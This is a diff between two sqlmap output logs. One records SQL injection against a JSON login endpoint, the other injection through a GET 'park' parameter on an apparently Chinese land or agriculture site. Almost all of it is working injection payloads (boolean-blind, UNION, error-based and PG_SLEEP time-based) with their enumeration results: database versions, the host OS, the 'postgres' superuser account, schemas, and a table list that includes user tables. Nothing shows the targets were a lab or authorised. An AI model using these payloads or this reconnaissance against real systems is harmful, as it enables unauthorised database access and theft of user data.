@@ -1,443 +1,232 @@
-sqlmap identified the following injection point(s) with a total of 70 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
 ---
-Parameter: JSON password ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
-
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
-
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 3031=3031 AND 'Bczx'='Bczx&productType=%E9%AB%98%E5%B9%B2%E5%B0%8F%E4%B9%94&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
-available databases [3]:
+available databases [4]:
 [*] information_schema
 [*] pg_catalog
 [*] public
+[*] topology
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: JSON password ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
-
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
----
-back-end DBMS: PostgreSQL
-select version();:    'PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609, 64-bit'
-status;:    '0'
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: JSON password ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
-
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 3031=3031 AND 'Bczx'='Bczx&productType=%E9%AB%98%E5%B9%B2%E5%B0%8F%E4%B9%94&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
 sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: JSON password ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
-
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 3031=3031 AND 'Bczx'='Bczx&productType=%E9%AB%98%E5%B9%B2%E5%B0%8F%E4%B9%94&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
-sqlmap resumed the following injection point(s) from stored session:
+No tables found
+sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
 ---
-Parameter: JSON password ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
-available databases [3]:
+available databases [4]:
 [*] information_schema
 [*] pg_catalog
 [*] public
+[*] topology
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: JSON password ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 ---
 back-end DBMS: PostgreSQL
-Database: public
-[14 tables]
-+-----------------+
-| user            |
-| article         |
-| county          |
-| farming         |
-| gagouser        |
-| land            |
-| land_sm         |
-| point           |
-| role            |
-| soilpoint       |
-| spatial_ref_sys |
-| test            |
-| test_tb         |
-| weather         |
-+-----------------+
+current user:    'postgres'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: park (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+---
+back-end DBMS operating system: Linux Red Hat
+back-end DBMS: PostgreSQL
+banner:    'PostgreSQL 9.5.6 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-11), 64-bit'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: park (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+---
+back-end DBMS: active fingerprint: PostgreSQL >= 9.5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: park (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+---
+back-end DBMS: PostgreSQL
+current schema (equivalent to database on PostgreSQL):    'public'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: park (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 8122=(SELECT 8122 FROM PG_SLEEP(5)) AND 'hqqE'='hqqE&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
+---
+back-end DBMS: PostgreSQL
+database management system users [1]:
+[*] postgres
 
 sqlmap resumed the following injection point(s) from stored session:
 ---
-Parameter: JSON password ((custom) POST)
+Parameter: park (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago","password":"670b14728ad9902aecba32e22fa4f6bd' AND 8481=8481 AND 'aawu'='aawu"}
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 1718=1718 AND 'eXru'='eXru&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"gago","password":"-9993' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(97)||CHR(97)||CHR(107)||CHR(101)||CHR(111)||CHR(120)||CHR(71)||CHR(104)||CHR(104)||CHR(69)||CHR(76)||CHR(118)||CHR(73)||CHR(111)||CHR(83)||CHR(81)||CHR(84)||CHR(68)||CHR(97)||CHR(113)||CHR(71)||CHR(86)||CHR(97)||CHR(82)||CHR(66)||CHR(89)||CHR(78)||CHR(115)||CHR(121)||CHR(68)||CHR(66)||CHR(70)||CHR(87)||CHR(98)||CHR(73)||CHR(68)||CHR(104)||CHR(86)||CHR(65)||CHR(88))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL,NULL,NULL-- CJao"}
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: park=%E9%95%BF%E6%BB%A9%E5%9F%BA%E5%9C%B0' AND 9706=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (9706=9706) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113)) AS NUMERIC) AND 'sRQH'='sRQH&villageCommunity=%E9%95%BF%E6%BB%A9%E4%B8%80%E7%A4%BE
 
-Parameter: JSON username ((custom) POST)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: {"username":"gago' AND 8413=8413 AND 'QHuf'='QHuf","password":"670b14728ad9902aecba32e22fa4f6bd"}
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 8 columns
-    Payload: {"username":"-5187' UNION ALL SELECT NULL,NULL,NULL,NULL,(CHR(113)||CHR(112)||CHR(107)||CHR(107)||CHR(113))||(CHR(85)||CHR(103)||CHR(109)||CHR(105)||CHR(97)||CHR(83)||CHR(82)||CHR(121)||CHR(106)||CHR(89)||CHR(101)||CHR(90)||CHR(115)||CHR(77)||CHR(87)||CHR(78)||CHR(115)||CHR(77)||CHR(107)||CHR(89)||CHR(82)||CHR(80)||CHR(89)||CHR(70)||CHR(103)||CHR(65)||CHR(116)||CHR(83)||CHR(69)||CHR(104)||CHR(74)||CHR(79)||CHR(100)||CHR(103)||CHR(72)||CHR(69)||CHR(77)||CHR(122)||CHR(87)||CHR(118))||(CHR(113)||CHR(120)||CHR(112)||CHR(107)||CHR(113)),NULL,NULL-- aBkC","password":"670b14728ad9902aecba32e22fa4f6bd"}
+    Type: AND/OR time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
